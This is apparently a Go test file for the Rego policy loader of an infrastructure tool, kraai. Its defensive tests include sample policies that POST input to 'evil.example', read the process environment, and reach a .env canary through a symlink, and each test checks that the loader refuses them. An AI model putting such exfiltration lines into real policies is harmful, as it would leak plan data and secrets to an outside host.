package policy

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/evatt-labs/kraai/internal/manifest"
)

// manifestWith writes each policy, a slash-separated path, under the
// manifest's policies directory.
func manifestWith(t *testing.T, policies map[string]string) manifest.FS {
	t.Helper()
	fsys, err := manifest.NewFS(manifestDir(t, policies))
	if err != nil {
		t.Fatal(err)
	}
	return fsys
}

func manifestDir(t *testing.T, policies map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ManifestDir), 0o750); err != nil {
		t.Fatal(err)
	}
	for name, source := range policies {
		path := filepath.Join(dir, ManifestDir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(source), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

const noNAT = `package kraai.plan

deny contains msg if {
	some action in input.actions
	action.vendor_type == "AWS::EC2::NatGateway"
	input.overlay.kind == "ephemeral"
	msg := sprintf("%s: an ephemeral environment may not carry a NAT gateway", [action.binding])
}
`

var planInput = map[string]any{
	"overlay": map[string]any{"kind": "ephemeral"},
	"actions": []any{
		map[string]any{"binding": "NET", "vendor_type": "AWS::EC2::NatGateway"},
		map[string]any{"binding": "JOBS", "vendor_type": "AWS::SQS::Queue"},
	},
}

func TestNoPoliciesDenyNothing(t *testing.T) {
	set, err := Load(manifestWith(t, nil), nil, nil)
	if err != nil || !set.Empty() {
		t.Fatalf("Load = %+v, %v", set, err)
	}
	if denials, err := set.Evaluate(context.Background(), GatePlan, planInput); err != nil || denials != nil {
		t.Fatalf("Evaluate = %v, %v", denials, err)
	}
}

func TestPlanPolicyDenies(t *testing.T) {
	set, err := Load(manifestWith(t, map[string]string{"nat.rego": noNAT}), nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	denials, err := set.Evaluate(context.Background(), GatePlan, planInput)
	if err != nil || !reflect.DeepEqual(denials, []string{"NET: an ephemeral environment may not carry a NAT gateway"}) {
		t.Fatalf("Evaluate = %v, %v", denials, err)
	}
	// The destroy gate has no policy here, so it denies nothing.
	if denials, err := set.Evaluate(context.Background(), GateDestroy, planInput); err != nil || denials != nil {
		t.Fatalf("destroy gate = %v, %v", denials, err)
	}
	// Remove the violation and the plan passes.
	persistent := map[string]any{"overlay": map[string]any{"kind": "persistent"}, "actions": planInput["actions"]}
	if denials, err := set.Evaluate(context.Background(), GatePlan, persistent); err != nil || len(denials) != 0 {
		t.Fatalf("a persistent environment = %v, %v", denials, err)
	}
}

// Helpers under kraai.lib are usable; a message that is not a string is
// reported as its JSON; policies come from --policy files and directories.
func TestHelpersNonStringMessagesAndExtraPaths(t *testing.T) {
	extraDir := t.TempDir()
	lib := "package kraai.lib.names\n\nprotected(b) if b == \"DB\"\n"
	destroy := "package kraai.destroy\n\nimport data.kraai.lib.names\n\ndeny contains {\"binding\": a.binding} if {\n\tsome a in input.actions\n\tnames.protected(a.binding)\n}\n"
	if err := os.WriteFile(filepath.Join(extraDir, "lib.rego"), []byte(lib), 0o600); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(t.TempDir(), "destroy.rego")
	if err := os.WriteFile(file, []byte(destroy), 0o600); err != nil {
		t.Fatal(err)
	}
	set, err := Load(manifestWith(t, nil), []string{extraDir, file}, nil)
	if err != nil {
		t.Fatal(err)
	}
	denials, err := set.Evaluate(context.Background(), GateDestroy, map[string]any{"actions": []any{map[string]any{"binding": "DB"}}})
	if err != nil || !reflect.DeepEqual(denials, []string{`{"binding":"DB"}`}) {
		t.Fatalf("Evaluate = %v, %v", denials, err)
	}
}

// Denials are sorted as the text they print as. OPA orders a set by type,
// strings before arrays, which is not the order of their encodings.
func TestDenialsAreSortedAsPrinted(t *testing.T) {
	policy := "package kraai.plan\n\ndeny contains \"a\"\n\ndeny contains [\"x\"]\n"
	set, err := Load(manifestWith(t, map[string]string{"mixed.rego": policy}), nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	denials, err := set.Evaluate(context.Background(), GatePlan, map[string]any{})
	if err != nil || !reflect.DeepEqual(denials, []string{`["x"]`, "a"}) {
		t.Fatalf("Evaluate = %q, %v", denials, err)
	}
}

// A policy can arrive in the pull request it judges: nothing it runs may
// reach the network or read the process environment.
func TestForbiddenBuiltinsRefuseToLoad(t *testing.T) {
	for name, body := range map[string]string{
		"http.send":          `r := http.send({"method": "POST", "url": "https://evil.example", "body": input})`,
		"opa.runtime":        `r := opa.runtime().env`,
		"net.lookup_ip_addr": `r := net.lookup_ip_addr("evil.example")`,
	} {
		policy := "package kraai.plan\n\ndeny contains \"x\" if {\n\t" + body + "\n\tr\n}\n"
		_, err := Load(manifestWith(t, map[string]string{"leak.rego": policy}), nil, nil)
		if err == nil || !strings.Contains(err.Error(), name) {
			t.Errorf("%s: Load = %v, want a refusal naming it", name, err)
		}
	}
}

// Every way a policy could silently never run is a load error.
func TestAPolicyThatWouldNeverRunFailsToLoad(t *testing.T) {
	for name, c := range map[string]struct {
		source, want string
	}{
		"misspelled package":    {strings.Replace(noNAT, "kraai.plan", "kraai.plans", 1), "declares package kraai.plans"},
		"misnamed rule":         {strings.Replace(noNAT, "deny contains", "denies contains", 1), "define no deny rule"},
		"a complete deny rule":  {"package kraai.plan\n\ndeny := \"no\"\n", "must be a set of messages"},
		"a syntax error":        {"package kraai.plan\n\ndeny contains msg if {\n", "parsing policy"},
		"an undefined function": {"package kraai.plan\n\ndeny contains \"x\" if not_a_builtin(1)\n", "not_a_builtin"},
	} {
		_, err := Load(manifestWith(t, map[string]string{"p.rego": c.source}), nil, nil)
		if err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: Load = %v, want %q", name, err, c.want)
		}
	}
}

// Evaluation is bounded: apply holds the environment lock while it runs.
func TestEvaluationIsBounded(t *testing.T) {
	saved := evalTimeout
	evalTimeout = 200 * time.Millisecond
	t.Cleanup(func() { evalTimeout = saved })

	slow := "package kraai.plan\n\ndeny contains \"x\" if {\n\tsome i in numbers.range(1, 100000000)\n\ti < 0\n}\n"
	set, err := Load(manifestWith(t, map[string]string{"slow.rego": slow}), nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	_, err = set.Evaluate(context.Background(), GatePlan, planInput)
	if err == nil || !strings.Contains(err.Error(), "took longer than") {
		t.Fatalf("Evaluate = %v, want the deadline reported", err)
	}
	if elapsed := time.Since(start); elapsed > 20*time.Second {
		t.Fatalf("evaluation ran %v past a 200ms deadline", elapsed)
	}
}

// The manifest's policies and --policy ones each deny on their own, and a
// message both produce is reported once.
func TestBothGroupsDeny(t *testing.T) {
	extra := filepath.Join(t.TempDir(), "extra.rego")
	src := "package kraai.plan\n\ndeny contains \"shared\"\n\ndeny contains \"from --policy\"\n"
	if err := os.WriteFile(extra, []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	manifestSrc := "package kraai.plan\n\ndeny contains \"shared\"\n\ndeny contains \"from policies/\"\n"
	set, err := Load(manifestWith(t, map[string]string{"m.rego": manifestSrc}), []string{extra}, nil)
	if err != nil {
		t.Fatal(err)
	}
	denials, err := set.Evaluate(context.Background(), GatePlan, map[string]any{})
	if want := []string{"from --policy", "from policies/", "shared"}; err != nil || !reflect.DeepEqual(denials, want) {
		t.Fatalf("Evaluate = %q, %v, want %q", denials, err, want)
	}
}

// A policy symlinked to another file in the manifest directory is refused
// before it is parsed, since a parse error would quote that file.
func TestASymlinkedPolicyIsRefusedUnread(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ManifestDir), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".env"), []byte("TOKEN=canary-8f3a1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../.env", filepath.Join(dir, ManifestDir, "leak.rego")); err != nil {
		t.Fatal(err)
	}
	fsys, err := manifest.NewFS(dir)
	if err != nil {
		t.Fatal(err)
	}
	_, err = Load(fsys, nil, nil)
	if err == nil || !strings.Contains(err.Error(), "not a regular file") || strings.Contains(err.Error(), "canary") {
		t.Fatalf("Load = %v, want a refusal that does not quote the target", err)
	}
}

// denyAll denies every plan with msg.
func denyAll(msg string) string {
	return "package kraai.plan\n\ndeny contains \"" + msg + "\"\n"
}

// trustedDir writes files, relative paths to sources, under a fresh
// directory standing in for a --policy checkout.
func trustedDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, source := range files {
		path := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(source), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// A set named by the environment is read from policies/<name>/ and from
// <dir>/<name>/ under each --policy directory; one not named is not read.
func TestPolicySets(t *testing.T) {
	cases := map[string]struct {
		manifest map[string]string
		trusted  map[string]string
		sets     []string
		want     []string
		wantErr  string
	}{
		"in the manifest": {
			manifest: map[string]string{"production/p.rego": denyAll("manifest production"), "staging/s.rego": denyAll("staging")},
			sets:     []string{"production"},
			want:     []string{"manifest production"},
		},
		"under --policy": {
			trusted: map[string]string{"production/p.rego": denyAll("trusted production"), "staging/s.rego": denyAll("staging")},
			sets:    []string{"production"},
			want:    []string{"trusted production"},
		},
		"in both": {
			manifest: map[string]string{"production/p.rego": denyAll("manifest production")},
			trusted:  map[string]string{"production/p.rego": denyAll("trusted production")},
			sets:     []string{"production"},
			want:     []string{"manifest production", "trusted production"},
		},
		"not named": {
			manifest: map[string]string{"top.rego": denyAll("top"), "production/p.rego": denyAll("manifest production")},
			want:     []string{"top"},
		},
		"found nowhere": {
			manifest: map[string]string{"top.rego": denyAll("top")},
			sets:     []string{"production"},
			wantErr:  `names policy set "production"`,
		},
		"not under --policy either": {
			trusted: map[string]string{"x.rego": denyAll("x"), "staging/s.rego": denyAll("staging")},
			sets:    []string{"production"},
			wantErr: `names policy set "production"`,
		},
		"a directory with no policy": {
			manifest: map[string]string{"production/README": "nothing here"},
			sets:     []string{"production"},
			wantErr:  `names policy set "production"`,
		},
		"a traversal": {
			trusted: map[string]string{"x.rego": denyAll("x")},
			sets:    []string{".."},
			wantErr: "must match",
		},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			var extra []string
			if c.trusted != nil {
				extra = []string{trustedDir(t, c.trusted)}
			}
			set, err := Load(manifestWith(t, c.manifest), extra, c.sets)
			if c.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), c.wantErr) {
					t.Fatalf("Load = %v, want %q", err, c.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			denials, err := set.Evaluate(context.Background(), GatePlan, map[string]any{})
			if err != nil || !reflect.DeepEqual(denials, c.want) {
				t.Fatalf("Evaluate = %q, %v, want %q", denials, err, c.want)
			}
		})
	}
}

// A set directory symlinked elsewhere in the manifest is refused, as a
// symlinked policy file is.
func TestASymlinkedSetIsRefused(t *testing.T) {
	root := manifestDir(t, nil)
	if err := os.MkdirAll(filepath.Join(root, "elsewhere"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "elsewhere", "p.rego"), []byte(denyAll("x")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../elsewhere", filepath.Join(root, ManifestDir, "production")); err != nil {
		t.Fatal(err)
	}
	fsys, err := manifest.NewFS(root)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := Load(fsys, nil, []string{"production"}); err == nil || !strings.Contains(err.Error(), "not a directory") {
		t.Fatalf("Load = %v, want the symlink refused", err)
	}
}
